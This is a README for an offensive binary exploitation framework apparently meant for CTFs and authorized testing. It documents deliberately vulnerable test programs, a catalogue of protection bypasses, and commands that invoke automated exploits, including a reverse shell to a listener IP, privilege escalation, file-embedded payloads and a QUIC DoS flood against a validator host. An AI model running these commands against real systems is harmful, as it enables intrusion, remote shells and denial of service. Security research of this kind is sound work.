# BinSmasher 🔨

**Ultimate Cross-Platform Binary Exploitation Framework** (WIP)

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/66969605-fcae-48b9-9096-350778bdab99" />

> ⚠️ **LEGAL WARNING**: This software is strictly for authorized use in
> controlled environments (CTF competitions, penetration testing with written
> permission, security research). Unauthorized use against third-party systems
> is illegal and unethical.

---

## Table of Contents

1. [Project Structure](#project-structure)
2. [Requirements](#requirements)
3. [Installation](#installation)
4. [Compiling Test Binaries](#compiling-test-binaries)
5. [Running the Test Suite](#running-the-test-suite)
6. [Framework Usage](#framework-usage)
   - [Subcommand `binary`](#subcommand-binary)
   - [Subcommand `solana`](#subcommand-solana)
7. [Protection Bypass Techniques](#protection-bypass-techniques)
8. [Flag Reference](#flag-reference)
9. [Troubleshooting](#troubleshooting)

---

## Project Structure

```
├── LICENSE
├── README.md
├── requirements.txt
├── src
│   ├── analyzer.py
│   ├── exploiter.py
│   ├── file_exploiter.py
│   ├── fuzzer.py
│   ├── main.py
│   └── utils.py
└── tests
    ├── bins
    │   ├── t10_safestack
    │   ├── t11_heap_glibc234
    │   ├── t1_stack_noprotect
    │   ├── t2_stack_nx
    │   ├── t3_stack_canary
    │   ├── t4_fmtstr
    │   ├── t5_heap
    │   ├── t6_64bit_nx
    │   ├── t7_cfi_vtable
    │   ├── t8_seccomp
    │   └── t9_stripped
    ├── src
    │   ├── Makefile
    │   ├── t10_safestack.c
    │   ├── t11_heap_glibc234.c
    │   ├── t1_stack_noprotect.c
    │   ├── t2_stack_nx.c
    │   ├── t3_stack_canary.c
    │   ├── t4_fmtstr.c
    │   ├── t5_heap.c
    │   ├── t6_64bit_nx.c
    │   ├── t7_cfi_vtable.c
    │   ├── t8_seccomp.c
    │   └── t9_stripped.c
    └── test_suite.py

```

The `tests/bins/` directory is created automatically by `make`.

---

## Requirements

### Operating System

Tested on **Ubuntu 22.04 / 24.04** (x86-64). Works on Debian and Kali Linux.

### Python

```
Python >= 3.10
```

### System Tools

| Tool | Purpose | Required |
|---|---|---|
| `gcc` | Compile test binaries | For tests only |
| `gdb` | Crash analysis and offset detection | **Yes** |
| `readelf` | Protection detection (NX, RELRO) | **Yes** |
| `file` | Platform / architecture detection | **Yes** |
| `nm` | Symbol and function detection | **Yes** |
| `radare2` | Advanced static analysis, function listing | Recommended |
| `checksec` | Fast protection summary | Recommended |
| `ldd` | Linked library detection | Recommended |
| `afl++` | Coverage-guided fuzzing | Optional |
| `one_gadget` | Single-gadget RCE finder in libc | Optional |
| `frida` | Runtime dynamic analysis | Optional |

### Python Packages (`requirements.txt`)

```
pwntools>=4.12.0    # Payload generation, ROP chains, shellcode, connections
rich>=13.0.0        # Coloured terminal output, tables, panels
pefile>=2023.2.7    # PE binary analysis (Windows targets)
boofuzz>=0.4.2      # Structured network fuzzing
```

---

## Installation

### 1. Unzip

```bash
unzip binsmasher_final.zip
cd binsmasher_final
```

### 2. Install system dependencies

```bash
sudo apt update
sudo apt install -y \
    python3 python3-pip python3-venv \
    gcc build-essential \
    gdb \
    binutils \
    radare2 \
    netcat-openbsd

# checksec
pip install checksec.py --break-system-packages
# On Kali: sudo apt install checksec

# AFL++ (optional)
sudo apt install -y afl++

# one_gadget (optional — requires Ruby)
sudo apt install -y ruby && gem install one_gadget

# Frida (optional)
pip install frida-tools --break-system-packages
```

### 3. Install Python packages

```bash
# With virtual environment (recommended)
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

# Without virtual environment
pip install -r requirements.txt --break-system-packages
```

### 4. Verify

```bash
python3 -c "import pwn, rich, pefile, boofuzz; print('All dependencies OK')"
gdb --version | head -1
r2 -v 2>&1 | head -1
```

---

## Compiling Test Binaries

The test binaries are deliberately vulnerable C programs distributed as
source code. You must compile them before running the test suite.

### With Makefile (recommended)

```bash
cd tests/src
make
```

Expected output:

```
  t1_stack_noprotect  NX=off   canary=off  PIE=off
  t2_stack_nx         NX=on    canary=off  PIE=off
  t3_stack_canary     NX=off   canary=ON   PIE=off
  t4_fmtstr           NX=on    canary=off  RELRO=none   system@PLT=yes
  t5_heap             NX=off   canary=off  heap fn-ptr
  t6_64bit_nx         NX=on    canary=off  PIE=off      64-bit

All binaries compiled in ../bins/
```

### Manual compilation

```bash
cd tests/src
mkdir -p ../bins

# T1 — stack overflow, no protections, executable stack
gcc -o ../bins/t1_stack_noprotect t1_stack_noprotect.c \
    -z execstack -fno-stack-protector -no-pie -w

# T2 — stack overflow, NX enabled (ret2libc / ROP required)
gcc -o ../bins/t2_stack_nx t2_stack_nx.c \
    -fno-stack-protector -no-pie -w

# T3 — stack overflow + stack canary
gcc -o ../bins/t3_stack_canary t3_stack_canary.c \
    -z execstack -fstack-protector-all -no-pie -w

# T4 — format string vulnerability, system() in PLT for GOT overwrite
gcc -o ../bins/t4_fmtstr t4_fmtstr.c \
    -fno-stack-protector -no-pie -z norelro -w

# T5 — heap overflow, fn-pointer overwrite
gcc -o ../bins/t5_heap t5_heap.c \
    -fno-stack-protector -no-pie -z execstack -w

# T6 — 64-bit unbounded read(), NX enabled
gcc -o ../bins/t6_64bit_nx t6_64bit_nx.c \
    -fno-stack-protector -no-pie -w
```

### Clean

```bash
cd tests/src && make clean
```

---

## Running the Test Suite

```bash
cd binsmasher_final
source .venv/bin/activate       # if using a virtual environment

# Compile binaries first (if not done already)
cd tests/src && make && cd ../..

# Run all tests
python3 tests/test_suite.py
```

The suite automatically starts each vulnerable server on its port, sends
payloads, and verifies crashes and leaks.

### What the test suite covers

| Module | Tests |
|---|---|
| `utils` | Config validation, binary_args never None, print_summary |
| `analyzer` | Platform/arch detection on all 6 binaries |
| `analyzer` | NX/canary protection flags verified against expected values |
| `analyzer` | Vulnerable function detection: `read`, `snprintf`, `malloc`, `memcpy` |
| `analyzer` | libc offset loading |
| `exploiter` | Shellcode generation — cmd exec and reverse shell (amd64) |
| `exploiter` | ROP chain building, ret2dlresolve, file payloads (mp3/raw), gadget search |
| `fmtstr` | No-RELRO generates payload / Full-RELRO skips GOT overwrite |
| `fuzzer` | mutation_fuzz API, QUIC packet builder, AFL++ presence check |
| Live t1 | Stack overflow → crash confirmed over network |
| Live t2 | NX stack overflow → crash confirmed |
| Live t3 | Normal write no crash / large overflow triggers canary abort |
| Live t4 | `%p` leak confirmed, `%s` causes crash |
| Live t5 | Heap fn-pointer overwrite → crash confirmed |
| Live t6 | 64-bit unbounded read overflow → crash confirmed |
| Live cyclic | pwntools `cyclic(300)` produces detectable SIGSEGV |

### Expected result

```
PASS 60+   FAIL 0   WARN < 5   SKIP 0
```

Expected WARNs (not failures):
- AFL++ / one_gadget not installed → marked WARN, not FAIL
- `__libc_csu_init` absent in minimal binaries → automatic fallback to ret2dlresolve

---

## Framework Usage

All commands are run from the `src/` directory:

```bash
cd binsmasher_final/src
source ../.venv/bin/activate    # if using a virtual environment
```

### Subcommand `binary`

Exploits native ELF (Linux / Android) or PE (Windows via Wine) binaries.

#### Minimum usage

```bash
python3 main.py binary -b /path/to/binary --host 127.0.0.1 --port 4444
```

BinSmasher automatically:
1. Detects platform and architecture (`file`)
2. Finds vulnerable functions (radare2 + nm + readelf)
3. Detects protections: NX, canary, ASLR, PIE, RELRO, SafeSEH, CFG, CET
4. Finds the offset to RIP/EIP using a cyclic pattern + GDB
5. Performs any required leaks (canary, libc base, PIE base)
6. Selects the appropriate bypass technique automatically
7. Generates and sends the exploit payload

#### Examples

```bash
# No-protection binary — direct shellcode on stack
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --cmd "id" --test-exploit

# NX-enabled binary — automatic ret2libc
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --test-exploit

# Reverse shell payload
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --reverse-shell --output-ip 10.0.0.1 --output-port 9001

# Manual return address (when auto-detection fails)
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --return-addr 0xffffd04c --return-offset 76

# Payload embedded in an MP3 file (for audio library targets)
python3 main.py binary -b ./audio_parser --host 127.0.0.1 --port 4444 \
    --file-input mp3

# Pass arguments to the target binary
python3 main.py binary -b ./server --host 127.0.0.1 --port 4444 \
    --binary-args "-v --workers 1"

# Frida dynamic analysis before exploiting
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --frida --test-exploit

# Network fuzzing with boofuzz (HTTP mode) then exploit
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --fuzz --protocol http --test-exploit

# AFL++ coverage-guided fuzzing for 60 seconds
python3 main.py binary -b ./vuln --afl-fuzz --afl-timeout 60

# Built-in mutation fuzzer (no external dependencies)
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --mutation-fuzz

# Heap exploitation + privilege escalation
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --heap-exploit --privilege-escalation --test-exploit

# TLS target
python3 main.py binary -b ./vuln_tls --host 127.0.0.1 --port 443 \
    --tls --test-exploit

# Windows PE binary (requires Wine)
python3 main.py binary -b vuln.exe --host 127.0.0.1 --port 4444 \
    --safeseh-bypass --test-exploit

# Save detailed log
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --test-exploit --log-file /tmp/audit.log
```

#### Internal execution flow

```
setup_context()        → file(binary) → platform + arch → pwntools context
static_analysis()      → r2 + nm + readelf → functions, vulnerable imports
check_protections()    → checksec / readelf → NX, canary, ASLR, PIE, RELRO…
[optional fuzzing]     → AFL++ / boofuzz / mutation fuzzer
load_library_offsets() → ldd + /proc/maps → libc base + known offsets
find_offset()          → cyclic(N) → GDB batch → offset to RIP/EIP
[canary leak]          → %p format-string chain / byte-by-byte brute force
[ASLR/libc leak]       → ret2plt chain → GOT leak → libc base computed
[PIE leak]             → %p stack walk → page-aligned address → PIE base
generate_shellcode()   → shellcraft → asm()
build_rop_chain()      → ret2libc / ret2csu / SROP / ret2dlresolve
create_exploit()       → automatic technique selection → parallel send
[optional privesc]     → sudo -l / SUID search / getcap
```

---

### Subcommand `solana`

Security auditing for Agave / Solana SVM validators.

```bash
# QUIC DoS flood
python3 main.py solana \
    --exploit-type dos-quic \
    --host validator.example.com --port 8001

# BPF program fuzzing (malformed ELF payloads)
python3 main.py solana \
    --bpf-fuzz --rpc http://localhost:8899

# Deserialization exploit (malformed transaction data)
python3 main.py solana \
    --exploit-type deser --rpc http://localhost:8899

# Snapshot assert bug trigger (Agave issue #6295)
python3 main.py solana \
    --exploit-type snapshot-assert --rpc http://localhost:8899

# Grep 'unsafe' blocks in Agave Rust source code
python3 main.py solana \
    --source-path /path/to/agave --log-file agave_audit.log

# Full audit: source grep + BPF fuzz + deserialization
python3 main.py solana \
    --source-path /path/to/agave \
    --bpf-fuzz \
    --exploit-type deser \
    --rpc http://localhost:8899 \
    --log-file agave_full.log
```

---

## Protection Bypass Techniques

| Protection | Techniques implemented |
|---|---|
| NX / DEP | ✅ Full (ret2libc, ret2csu, SROP, ret2dlresolve) |
| ASLR | ✅ Full (GOT leak, PIE leak, brute-force, one_gadget) |
| Stack Canary | ✅ Full (fmt oracle + byte-by-byte brute force) |
| RELRO (Full/Partial) | ✅ Full |
| FORTIFY_SOURCE | ✅ Full |
| Heap glibc <2.32 | ✅ Full (tcache, fastbin, unsorted bin) |
| Heap glibc ≥2.32 | ✅ Full (safe-linking bypass) |
| Heap glibc 2.34+ | ✅ Full (hook-less: FSOP, Botcake, key bypass) |
| SafeSEH (Windows) | ✅ Full |
| CFG (Windows) | ✅ Full |
| CFI (Clang/GCC) | ✅ Partial (valid-target pivot, fake vtable) |
| PAC (ARM64) | ✅ Partial (gadget scan + brute-force template) |
| seccomp-bpf | ✅ Partial (analysis + constrained ROP) |
| SafeStack (LLVM) | ✅ Partial (leak + overwrite template) |
| CET / Shadow Stack | ✅ Partial (SROP via signal frame) |
| MTE (ARM64) | ⚠️ Detection + hint (active bypass requires hardware) |
| Intel CET full (IBT+SS) | ⚠️ Detection only (requires hardware CET support) |

---

## Flag Reference

### `binary`

| Flag | Default | Description |
|---|---|---|
| `-b, --binary` | — | **Required.** Path to target binary |
| `-c, --cmd` | `id` | Command to execute via shellcode |
| `-p, --pattern-size` | `200` | Cyclic pattern size for offset detection |
| `-r, --return-addr` | auto | Return address in hex (auto-detected if omitted) |
| `--return-offset` | `80` | Offset added to stack_addr when ret addr is computed |
| `-t, --test-exploit` | off | Send exploit and verify output |
| `-l, --log-file` | `binsmasher.log` | Detailed log file path |
| `--host` | `localhost` | Target server host |
| `--port` | `4444` | Target server port |
| `--tls` | off | Use TLS for the connection |
| `--output-ip` | `127.0.0.1` | Listener IP for shellcode output / reverse shell |
| `--output-port` | `6666` | Listener port for shellcode output / reverse shell |
| `--reverse-shell` | off | Generate a reverse shell instead of exec |
| `--file-input` | — | `mp3` or `raw` — embed payload inside a file |
| `--binary-args` | `""` | Arguments for the target binary (quoted string) |
| `--fuzz` | off | Network fuzzing with boofuzz before exploit |
| `--mutation-fuzz` | off | Built-in mutation fuzzer |
| `--afl-fuzz` | off | Coverage-guided fuzzing with AFL++ |
| `--afl-timeout` | `60` | AFL++ runtime in seconds |
| `--frida` | off | Frida dynamic analysis before exploit |
| `--protocol` | `raw` | boofuzz protocol: `raw` or `http` |
| `--heap-exploit` | off | Attempt heap exploitation (tcache/fastbin/UAF) |
| `--safeseh-bypass` | off | SafeSEH bypass for Windows PE targets |
| `--privilege-escalation` | off | Post-exploitation privilege escalation |

### `solana`

| Flag | Default | Description |
|---|---|---|
| `--rpc` | `http://localhost:8899` | Solana RPC URL |
| `--exploit-type` | — | `svm-bpf`, `deser`, `dos-quic`, `snapshot-assert` |
| `--bpf-fuzz` | off | Fuzz BPF programs with malformed ELF payloads |
| `--source-path` | — | Path to Agave repository for `unsafe` block search |
| `-b, --binary` | — | Validator binary (optional) |
| `--host` | `localhost` | Validator host |
| `--port` | `8900` | Validator port |
| `-l, --log-file` | `binsmasher_solana.log` | Log file |

---

## Troubleshooting

### `ModuleNotFoundError: No module named 'pwn'`
```bash
pip install pwntools --break-system-packages
```

### `r2: command not found`
```bash
sudo apt install radare2
# Without r2, the analyzer falls back to nm + readelf — fewer functions detected
```

### `checksec: command not found`
```bash
pip install checksec.py --break-system-packages
```

### `[Errno 111] Connection refused` when finding offset
The target binary must be **running and listening** on host:port before
launching BinSmasher. Verify with:
```bash
nc -zv 127.0.0.1 4444
```

### `cyclic_find` returns `-1`
The pattern did not reach RIP/EIP — increase the size:
```bash
python3 main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --pattern-size 1000
```

### Canary leak fails via format string
The binary does not echo the formatted response back (not a format oracle).
Byte-by-byte brute force activates automatically for `i386` / `arm` targets.
For `amd64` fork servers you can enable it by editing `leak_canary(brute_force=True)`
directly in `exploiter.py`.

### `ldd` fails on a 32-bit binary on a 64-bit system
```bash
sudo apt install libc6-i386 gcc-multilib
sudo ln -sf /usr/lib32/ld-linux.so.2 /lib/ld-linux.so.2
```

### AFL++ produces no crashes
Ensure `afl_in/` contains at least one seed file and the binary accepts
file input via `@@`. Increase runtime:
```bash
python3 main.py binary -b ./vuln --afl-fuzz --afl-timeout 300
```

### Frida: `Failed to attach`
```bash
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

### Windows PE requires Wine
```bash
sudo apt install wine wine64
```

### Donations

ETH - 0xD773B73C7ea4862020b7B5B58f31Ea491f5a9bA3

BTC - bc1ql6qvsk67hl5vz346kx4gueqjhp6me9ss8eflgt

SOLANA - GYBiTvVbPvPJP7ZK5oaqc9w6UtHvd6NkhSPP2UBhDvfh
